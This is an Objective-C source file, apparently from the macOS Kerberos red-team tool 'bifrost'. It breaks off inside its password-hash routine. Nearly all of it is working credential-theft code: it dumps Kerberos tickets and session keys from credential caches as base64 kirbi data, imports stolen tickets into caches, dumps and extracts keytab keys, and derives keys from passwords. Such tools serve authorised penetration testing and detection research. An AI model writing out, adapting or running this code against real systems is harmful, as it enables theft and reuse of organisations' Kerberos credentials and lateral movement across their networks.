//
//  bifrost.m
//  bifrost
//
//  Created by @its_a_feature_ on 10/14/19.
//  Copyright © 2019 Cody Thomas (@its_a_feature_). All rights reserved.
//

#import "bifrost.h"

void printKrbError(krb5_context context, krb5_error_code ret){
    const char *error =  krb5_get_error_message(context, ret);
    printf("[-] %s\n", error);
    krb5_free_error_message(context, error);
}
NSString* getKrbError(krb5_context context, krb5_error_code ret) {
    const char *error = krb5_get_error_message(context, ret);
    NSMutableString* krbError = [[NSMutableString alloc] initWithString:@"[-] "];
    [krbError appendString:[[NSString alloc] initWithCString:error encoding:NSUTF8StringEncoding]];
    [krbError appendString:@"\n"];
    krb5_free_error_message(context, error);
    return krbError;
}

@implementation bifrost
-(int)getEncValueFromEnctype:(NSString*)enctypeString{
    if( [enctypeString isEqualToString:@"aes256"] ){
        return ENCTYPE_AES256_CTS_HMAC_SHA1_96;
    } else if( [enctypeString isEqualToString:@"aes128"] ){
        return ENCTYPE_AES128_CTS_HMAC_SHA1_96;
    } else if( [enctypeString isEqualToString:@"rc4"] ){
        return ENCTYPE_ARCFOUR_HMAC;
    } else if( [enctypeString isEqualToString:@"des3"] ){
        return ENCTYPE_DES3_CBC_SHA1;
    }
    else {
        return 0;
    }
}
-(NSString*)dumpCredentialsToKirbiCCache: (char*)ccache Destroy:(bool)destroy{
    krb5_context context;
    krb5_cc_cursor cursor;
    krb5_error_code ret;
    krb5_ccache id;
    krb5_creds creds;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if(ccache == NULL){
        ret = krb5_cc_default(context, &id);
    } else{
        ret = krb5_cc_resolve(context, ccache, &id);
    }
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    ret = krb5_cc_start_seq_get(context, id, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    while((ret = krb5_cc_next_cred(context, id, &cursor, &creds)) == 0){
        Krb5Ticket tkt;
        tkt.app29 = [[KerbApp29 alloc] init];
        char* principal;
        krb5_unparse_name(context, creds.server, &principal);
        
        tkt.app29.enctype29 = [[KerbInteger alloc] initWithValue:creds.keyblock.enctype];
        tkt.app29.key = [[KerbOctetString alloc] initWithValue:[[NSData alloc] initWithBytes:creds.keyblock.contents length:creds.keyblock.length]];
        tkt.app29.realm29 = [[KerbGenericString alloc] initWithValue:[[NSString alloc] initWithCString:creds.server->realm.data encoding:NSUTF8StringEncoding]];
        tkt.app29.flags = [[KerbBitString alloc] initWithValue:creds.ticket_flags];
        NSDateFormatter *format = [[NSDateFormatter alloc] init];
        format.dateFormat = @"YYYYMMddHHmmss";
        format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
        NSMutableString* startTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.starttime]]];
        [startTime appendString:@"Z"];
        tkt.app29.start = [[KerbGeneralizedTime alloc] initWithValue:startTime];
        NSMutableString* renewTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.renew_till]]];
        [renewTime appendString:@"Z"];
        tkt.app29.till = [[KerbGeneralizedTime alloc] initWithValue:renewTime];
        NSMutableString* endTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.endtime]]];
        [endTime appendString:@"Z"];
        tkt.app29.end = [[KerbGeneralizedTime alloc] initWithValue:endTime];
        tkt.app29.sname29 = [[KerbSNamePrincipal alloc] initWithValueAccount:[[NSString alloc] initWithCString:(creds.server->data)[0].data encoding:NSUTF8StringEncoding] Domain:[[NSString alloc] initWithCString:(creds.server->data)[1].data encoding:NSUTF8StringEncoding]];
        tkt.app29.sname29.krb5_nt_srv_inst = [[KerbInteger alloc] initWithValue:creds.server->type];
        tkt.app29.cname = [[KerbCNamePrincipal alloc] initWithValueUsername:[[NSString alloc] initWithCString:(creds.client->data)[0].data encoding:NSUTF8StringEncoding]];
        tkt.app29.cname.krb5_int_principal = [[KerbInteger alloc] initWithValue:creds.client->type];
        
        char *client;
        krb5_unparse_name(context, creds.client, &client);
        [output appendString:[[NSString alloc] initWithFormat:@"\nClient: %s\n", client]];
        //printf("\nClient: %s\n", client);
        [output appendString:[[NSString alloc] initWithFormat:@"Principal: %s\n", principal]];
        //printf("Principal: %s\n", principal);
        if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: aes128\n"]];
            //printf("Key enctype: aes128\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_DES3_CBC_SHA1){
            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: des3\n"]];
            //printf("Key enctype: des3\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: aes256\n"]];
            //printf("Key enctype: aes256\n");
        }else if(tkt.app29.enctype29.KerbIntValue == ENCTYPE_ARCFOUR_HMAC){
            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: rc4\n"]];
            //printf("Key enctype: rc4");
        }else{
            [output appendString:[[NSString alloc] initWithFormat:@"Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue]];
            //printf("Key enctype: %d\n", tkt.app29.enctype29.KerbIntValue);
        }
        //printf("\tKey length: %d\n", tkt.app29.key.KerbOctetvalue.length);
        [output appendString:[[NSString alloc] initWithFormat:@"Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String]];
        //printf("Key: %s (", [tkt.app29.key.KerbOctetvalue base64EncodedStringWithOptions:0].UTF8String);
        for(int i = 0; i < tkt.app29.key.KerbOctetvalue.length; i++){
            [output appendString:[[NSString alloc] initWithFormat:@"%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]]];
            //printf("%02X", ((Byte*)tkt.app29.key.KerbOctetvalue.bytes)[i]);
        }
        //printf(")\n");
        [output appendString:[[NSString alloc] initWithFormat:@")\n"]];
        //printf("Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String);
        [output appendString:[[NSString alloc] initWithFormat:@"Expires: %s\n", [tkt.app29.end printTimeUTC].UTF8String]];
        //printf("Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String);
        [output appendString:[[NSString alloc] initWithFormat:@"Flags: %s\n", describeFlags(tkt.app29.flags.KerbBitValue).UTF8String]];
        krb5_authdata **authdata = creds.authdata;
        krb5_authdata curAuthdata;
        if(authdata != NULL){
            [output appendString:[[NSString alloc] initWithFormat:@"Authdata: "]];
            //printf("Authdata: ");
            for(int i = 0; authdata[i] != NULL; i++){
                curAuthdata = *authdata[i];
                for(int j = 0; j < curAuthdata.length; j++){
                    [output appendString:[[NSString alloc] initWithFormat:@"%02X", curAuthdata.contents[j]]];
                    //printf("%02X", curAuthdata.contents[j]);
                }
                [output appendString:[[NSString alloc] initWithFormat:@"\n"]];
                //printf("\n");
            }
        }
        NSString* xcacheconf = @"X-CACHECONF";
        NSString* nsprincipal = [[NSString alloc] initWithCString:principal encoding:NSUTF8StringEncoding];
        if([nsprincipal containsString:xcacheconf]){
            //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
            [output appendString:[[NSString alloc] initWithFormat:@"Principal Type: %s\n", (creds.server->data)[1].data]];
            //printf("Principal type: %s\n", (creds.server->data)[1].data);
            [output appendString:[[NSString alloc] initWithFormat:@"Ticket Data: \n%s\n",  [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String]];
            //printf("Ticket Data: \n%s\n", [[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length] base64EncodedStringWithOptions:0].UTF8String);
        }
        else{
            tkt.app1 = [[KerbApp1 alloc] initWithObject:[[ASN1_Obj alloc] initWithType:0x61 Length:creds.ticket.length Data:[[NSData alloc] initWithBytes:creds.ticket.data length:creds.ticket.length]]];
            NSData* kirbi = createKirbi(tkt);
            [output appendString:[[NSString alloc] initWithFormat:@"Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String]];
            //printf("Kirbi:\n%s\n\n", [kirbi base64EncodedStringWithOptions:0].UTF8String);
        }
        krb5_free_cred_contents (context, &creds);
    }
    ret = krb5_cc_end_seq_get(context, id, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if(destroy && ccache != NULL){
        ret = krb5_cc_destroy (context, id);
        if (ret){
            [output appendString:getKrbError(context, ret)];
            @throw output;
        } else{
            [output appendString:[[NSString alloc] initWithFormat:@"[+] Removed CCache entry: %s\n", ccache]];
            //printf("[+] Removed CCache entry: %s\n", ccache);
        }
    }else{
        krb5_cc_close(context, id);
    }
    krb5_free_context(context);
    return output;
}
-(NSString*)listAllCCaches{
    krb5_context context;
    krb5_cccol_cursor cursor;
    krb5_cc_cursor cc_cursor;
    krb5_error_code ret;
    krb5_ccache entry;
    krb5_principal principal;
    krb5_creds creds;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    NSString* defaultName = [[NSString alloc] initWithUTF8String:krb5_cc_default_name(context)];
    krb5_cccol_cursor_new(context, &cursor);
    while((ret = krb5_cccol_cursor_next(context, cursor, &entry)) == 0){
        NSMutableString* name = [[NSMutableString alloc] initWithUTF8String:krb5_cc_get_type (context, entry)];
        [name appendFormat:@":%s", krb5_cc_get_name(context, entry) ];
        
        ret = krb5_cc_get_principal (context, entry,&principal);
        if(ret){
            [output appendString:getKrbError(context, ret)];
            continue;
        }
        char* principalString;
        krb5_unparse_name(context, principal , &principalString);
        
        if([defaultName isEqualToString:name]){
            [output appendString:[[NSString alloc] initWithFormat:@"\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String]];
            //printf("\n[*] Principal: %s\n    Name: %s", principalString, name.UTF8String);
        }else{
            [output appendString:[[NSString alloc] initWithFormat:@"\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String]];
            //printf("\n[+] Principal: %s\n    Name: %s", principalString, name.UTF8String);
        }
        // now loop through the entries of that cache and list them (not dump though)
        ret = krb5_cc_start_seq_get(context, entry, &cc_cursor);
        if (ret){
            [output appendString:getKrbError(context, ret)];
            @throw output;
        }
        [output appendString:[[NSString alloc] initWithFormat:@"\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n"]];
        //printf("\n\tIssued\t\t\t Expires\t\t\t    Principal\t\t\t\t\tFlags\n");
        while((ret = krb5_cc_next_cred(context, entry, &cc_cursor, &creds)) == 0){
            char* principal;
            krb5_unparse_name(context, creds.server, &principal);
            char *client;
            krb5_unparse_name(context, creds.client, &client);
            
            NSDateFormatter *format = [[NSDateFormatter alloc] init];
            format.dateFormat = @"YYYY-MM-dd HH:mm:sszz";

            NSMutableString* startTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.starttime]]];

            NSMutableString* endTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[NSDate dateWithTimeIntervalSince1970:creds.times.endtime]]];
            [output appendString:[[NSString alloc] initWithFormat:@"%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String]];
            //printf("%s\t%s\t%s\t(%s)\n", startTime.UTF8String, endTime.UTF8String, principal, describeFlags(creds.ticket_flags).UTF8String);
            
            krb5_free_cred_contents (context, &creds);
        }
        krb5_cc_end_seq_get(context, entry, &cc_cursor);
        krb5_cc_close(context, entry);
    }
    krb5_cccol_cursor_free(context, &cursor);
    krb5_free_context(context);
    //krb5_cc_get_config(krb5_context, krb5_ccache,krb5_const_principal,const char *, krb5_data *)
    return output;
}
-(krb5_creds)createKrb5CredFromKrb5Ticket:(Krb5Ticket)ticket{
    krb5_creds cred;
    krb5_context context;
    krb5_error_code ret;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.addresses = NULL;
    cred.authdata = NULL;
    cred.is_skey = false;
    cred.ticket.data = (char*)[ticket.app1 collapseToNSData].bytes;
    cred.ticket.length = (unsigned int)[ticket.app1 collapseToNSData].length;
    cred.ticket.magic = KV5M_TICKET;
    cred.ticket_flags = ticket.app29.flags.KerbBitValue;
    cred.keyblock.magic = KV5M_KEYBLOCK;
    cred.keyblock.enctype = ticket.app29.enctype29.KerbIntValue;
    cred.keyblock.length = (unsigned int)ticket.app29.key.KerbOctetvalue.length;
    cred.keyblock.contents = (unsigned char*)ticket.app29.key.KerbOctetvalue.bytes;
    krb5_principal sname;
    ret = krb5_build_principal(context, &sname, 2, ticket.app29.realm29.KerbGenStringvalue.UTF8String, ticket.app29.sname29.account.KerbGenStringvalue.UTF8String, ticket.app29.sname29.domain.KerbGenStringvalue.UTF8String, nil);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.server = sname;
    cred.magic = KV5M_CREDS;
    //convert generalizedTime formats back to integers
    NSDateFormatter *format = [[NSDateFormatter alloc] init];
    format.dateFormat = @"YYYYMMddHHmmssZ";
    format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    NSDate* ticketTime = [format dateFromString:ticket.app29.start.value];
    cred.times.starttime = ticketTime.timeIntervalSince1970;
    cred.times.authtime = cred.times.starttime;
    ticketTime = [format dateFromString:ticket.app29.end.value];
    cred.times.endtime = ticketTime.timeIntervalSince1970;
    ticketTime = [format dateFromString:ticket.app29.till.value];
    cred.times.renew_till = ticketTime.timeIntervalSince1970;
    //convert cname
    krb5_principal cname;
    ret = krb5_build_principal(context, &cname, 1, ticket.app1.realm.KerbGenStringvalue.UTF8String, ticket.app29.cname.username.KerbGenStringvalue.UTF8String, nil);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    cred.client = cname;
    //printf("[+] Successfully converted ticket to ccache cred\n");
    return cred;
}
-(NSString*)importCred:(NSString*)ticketKirbi ToCache:(NSString*)cacheName{
    krb5_ccache cache;
    krb5_context context;
    krb5_error_code ret;
    krb5_creds cred;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    Krb5Ticket ticket = parseKirbi([[NSData alloc] initWithBase64EncodedString:ticketKirbi options:0]);
    if(ticket.app29 == NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to parse Kirbi data\n"]];
        //printf("[-] Failed to parse Kirbi data\n");
        @throw output;
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully parsed Kirbi data\n"]];
        //printf("[+] Successfully parsed Kirbi data\n");
    }
    cred = [self createKrb5CredFromKrb5Ticket:ticket];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if([cacheName isEqualToString:@"new"]){
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Creating new ccache\n"]];
        //printf("[*] Creating new ccache\n");
        ret = krb5_cc_new_unique( context,"API","test", &cache);
        if(ret){
            [output appendString:getKrbError(context, ret)];
            @throw output;
        }
        //krb5_cc_initialize(context, entry, principal);
        ret = krb5_cc_initialize(context, cache, cred.client);
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving ccache name %s\n", cacheName.UTF8String]];
        //printf("[*] Resolving ccache name %s\n", cacheName.UTF8String);
        ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    }
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String]];
    //printf("[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String);
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        //printKrbError(context,ret);
        //printf("[-] Failed to store cred, trying to initialize first\n");
        //can't store cred to a new store without initializing it, so make sure to do that if storing fails
        ret = krb5_cc_initialize(context, cache, cred.client);
        if(ret){
            [output appendString:getKrbError(context, ret)];
            @throw output;
        }
        [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully initialized cache\n"]];
        //printf("[+] Successfully initialized cache\n");
    }
    ret = krb5_cc_store_cred(context, cache, &cred);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully imported credential to: %s\n", krb5_cc_get_name(context, cache)]];
    //printf("[+] Successfully imported credential\n");
    return output;
}
-(NSString*)removeCacheName:(NSString*)cacheName{
    //krb5_cc_destroy (context, entry);
    krb5_context context;
    krb5_error_code ret;
    krb5_ccache cache;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving CCache name: %s\n", cacheName.UTF8String]];
    //printf("[*] Resolving CCache name: %s\n", cacheName.UTF8String);
    ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully resolved CCache name\n"]];
    //printf("[+] Successfully resolved CCache name\n");
    ret = krb5_cc_destroy(context, cache);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully removed CCache\n"]];
    //printf("[+] Successfully removed CCache\n");
    return output;
}
-(NSString*)removePrincipal:(NSString*)principal FromCacheName:(NSString*)cacheName{
    //krb5_cc_remove_cred is not implemented by the MITKerberosShim, need to find a different way
    //krb5_cc_remove_cred (krb5_context context, krb5_ccache cache, krb5_flags flags,krb5_creds *creds)
    //NSString* result = @"[-] Failed to find principal\n";
    krb5_context context;
    krb5_error_code ret;
    krb5_ccache cache;
    krb5_cc_cursor cc_cursor;
    krb5_creds creds;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    ret = krb5_cc_resolve(context, cacheName.UTF8String, &cache);
    if(ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:@"[+] Successfully resolved CCache name\n"];
    //printf("[+] Successfully resolved CCache name\n");
    //now actually loop through the cache to find the specified principal
    ret = krb5_cc_start_seq_get(context, cache, &cc_cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    while((ret = krb5_cc_next_cred(context, cache, &cc_cursor, &creds)) == 0){
        char* curPrincipal;
        krb5_unparse_name(context, creds.server, &curPrincipal);
        if(strcmp(principal.UTF8String, curPrincipal) == 0){
            //we found the right principal, so now we need to remove it
            [output appendString:@"[+] Found Principal entry\n"];
            //printf("[+] Found Principal entry\n");
            //MITKerberosShim: function krb5_cc_remove_cred not implemented :'(
            ret = krb5_cc_remove_cred(context, cache, 8, &creds);
            if(ret){
                //printf("[-] Failed to remove cred\n");
                [output appendString:getKrbError(context, ret)];
                //printKrbError(context, ret);
                //result = @"error\n";
            }else{
                [output appendString:@"[+] Successfully removed\n"];
                //result = @"[+] Successfully removed\n";
            }
        }
        krb5_free_cred_contents (context, &creds);
    }
    krb5_cc_end_seq_get(context, cache, &cc_cursor);
    krb5_cc_close(context, cache);
    return output;
}
-(NSString*)ktutilKeyTabPath:(NSString*)keyTabPath{
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    krb5_keyblock key;
    char *principal;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if(keyTabPath != NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving keytab path\n"]];
        //printf("[*] Resolving keytab path\n");
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving default keytab path\n"]];
        //printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully opened keytab\n"]];
    //printf("[+] Successfully opened keytab\n");
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        [output appendString:[[NSString alloc] initWithFormat:@"[+] principal: %s\n", principal]];
        //printf("[+] principal: %s\n", principal);
        key = entry.key;
        [output appendString:[[NSString alloc] initWithFormat:@"\tEntry version: %d\n", entry.vno]];
        //printf("\tEntry version: %d\n", entry.vno);
        if(key.enctype == ENCTYPE_AES128_CTS_HMAC_SHA1_96){
            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: aes128\n"]];
            //printf("\tKey enctype: aes128\n");
        }else if(key.enctype == ENCTYPE_DES3_CBC_SHA1){
            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: des3\n"]];
            //printf("\tKey enctype: des3\n");
        }else if(key.enctype == ENCTYPE_AES256_CTS_HMAC_SHA1_96){
            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: aes256\n"]];
            //printf("\tKey enctype: aes256\n");
        }else if(key.enctype == ENCTYPE_ARCFOUR_HMAC){
            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: rc4\n"]];
            //printf("\tKey enctype: rc4\n");
        }
        else{
            [output appendString:[[NSString alloc] initWithFormat:@"\tKey enctype: %d\n", key.enctype]];
            //printf("\tKey enctype: %d\n", key.enctype);
        }
        //printf("Key length: %d\n", key.length);
        [output appendString:[[NSString alloc] initWithFormat:@"\tKey: "]];
        //printf("\tKey: ");
        for(int i = 0; i < key.length; i++){
            [output appendString:[[NSString alloc] initWithFormat:@"%02X", key.contents[i]]];
            //printf("%02X", key.contents[i]);
        }
        [output appendString:[[NSString alloc] initWithFormat:@"\n"]];
        //printf("\n");
        NSDateFormatter *newFormatter = [[NSDateFormatter alloc] init];
        newFormatter.dateFormat = @"YYYY-MM-dd HH:mm:ss z";
        newFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
        NSDate* ticketTime = [[NSDate alloc] initWithTimeIntervalSince1970:entry.timestamp ];
        [output appendString:[[NSString alloc] initWithFormat:@"\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String]];
        //printf("\tTimestamp: %s\n",[newFormatter stringFromDate:ticketTime].UTF8String );
        free(principal);
        //krb5_kt_free_entry(context, &entry);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    return output;
}
-(NSString*)removePrincipal:(NSString*)targetPrincipal fromKeytab:(NSString*)keyTabPath{
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    char *principal;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if(keyTabPath != NULL){
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving keytab path\n"]];
        //printf("[*] Resolving keytab path\n");
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        [output appendString:[[NSString alloc] initWithFormat:@"[*] Resolving default keytab path\n"]];
        //printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully opened keytab\n"]];
    //printf("[+] Successfully opened keytab\n");
    [output appendString:[[NSString alloc] initWithFormat:@"[*] Searching for principal\n"]];
    //printf("[*] Searching for principal\n");
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        if(strcmp(principal, targetPrincipal.UTF8String) == 0){
            [output appendString:[[NSString alloc] initWithFormat:@"[*] Found match, removing entry\n"]];
            //printf("[*] Found match, removing entry\n");
            ret = krb5_kt_remove_entry(context, keytab, &entry);
            if(ret){
                [output appendString:[[NSString alloc] initWithFormat:@"[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype]];
                //printf("[-] Failed to remove entry: %s, %d\n", principal, entry.key.enctype);
                continue;
            }else{
                [output appendString:[[NSString alloc] initWithFormat:@"[+] Successfully removed entry: %s\n", principal]];
                //printf("[+] Successfully removed entry: %s\n", principal);
            }
        }else{
            free(principal);
        }
        //krb5_kt_free_entry(context, &entry);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    return output;
}
-(NSString*)getKeyFromKeytab:(NSString*)keyTabPath andPrincipal:(NSString*)targetPrincipal withEnctype:(int)enctype{
    NSMutableString* hash = NULL;
    krb5_context context;
    krb5_keytab keytab;
    krb5_kt_cursor cursor;
    krb5_keytab_entry entry;
    krb5_error_code ret;
    char *principal;
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    if(keyTabPath != NULL){
        //printf("[*] Resolving keytab path: %s\n", keyTabPath.UTF8String);
        ret = krb5_kt_resolve(context, keyTabPath.fileSystemRepresentation, &keytab);
    }else{
        //printf("[*] Resolving default keytab path\n");
        ret = krb5_kt_default (context, &keytab);
    }
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    ret = krb5_kt_start_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    //printf("[+] Successfully opened keytab\n");
    //printf("[*] Searching for principal: %s\n", targetPrincipal.UTF8String);
    while((ret = krb5_kt_next_entry(context, keytab, &entry, &cursor)) == 0){
        krb5_unparse_name(context, entry.principal, &principal);
        if(strcmp(principal, targetPrincipal.UTF8String) == 0){
            if(enctype == entry.key.enctype){
                hash = [[NSMutableString alloc] initWithString:@""];
                //printf("[*] Found match, retrieving key\n");
                for(int i = 0; i < entry.key.length; i++){
                    [hash appendFormat:@"%02X", entry.key.contents[i]];
                }
                break;
            }
        }
        free(principal);
    }
    ret = krb5_kt_end_seq_get(context, keytab, &cursor);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_end_seq_get");
    ret = krb5_kt_close(context, keytab);
    if (ret){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
        //krb5_err(context, 1, ret, "krb5_kt_close");
    krb5_free_context(context);
    if(hash == NULL){
        @throw @"[-] Failed to find hash";
    }
    return hash;
}
-(NSString*)genPasswordHashPassword:(char*)password Length:(int)password_len Enc:(int)enc_type Username:(NSString*)username Domain:(NSString*)domain Pretty:(Boolean)prettyprint{
    krb5_context context;
    krb5_error_code ret;
    NSString *final_key = @"";
    NSMutableString* output = [[NSMutableString alloc] initWithString:@""];
    if ((ret = krb5_init_context (&context) != 0)){
        [output appendString:getKrbError(context, ret)];
        @throw output;
    }
    krb5_data data;
    data.data = password;
    data.magic = KV5M_KEYBLOCK;
    data.length =  password_len;

    // to generate the right salt
    //https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/
    krb5_data salt;
    NSString* combined_salt = [domain uppercaseString];
    if([username containsString:@"$"]){
        //this means we're looking at a computer account, so the salt is a little different
        NSString* nodollar = [username substringToIndex:username.length -1];
        combined_salt = [combined_salt stringByAppendingFormat:@"host%s.%s", [nodollar lowercaseString].UTF8String, [domain lowercaseString].UTF8String];
    }else{
        combined_salt = [combined_salt stringByAppendingString:username];
    }
    if(prettyprint){
        final_key = [final_key stringByAppendingFormat:@"Username: %s\nPassword: %s\nDomain: %s\nSalt: %s\n\nKeys:\n", username.UTF8String, password, domain.UTF8String, combined_salt.UTF8String];
    }
    
    salt.data = (char*)combined_salt.UTF8String;
    salt.magic = KV5M_KEYBLOCK;
    salt.length = (int)combined_salt.length;
    krb5_keyblock newKey;
    if(enc_type == 0){
        // go  through  to generate the most common hash types
        final_key = [final_key stringByAppendingString:@"AES128: "];
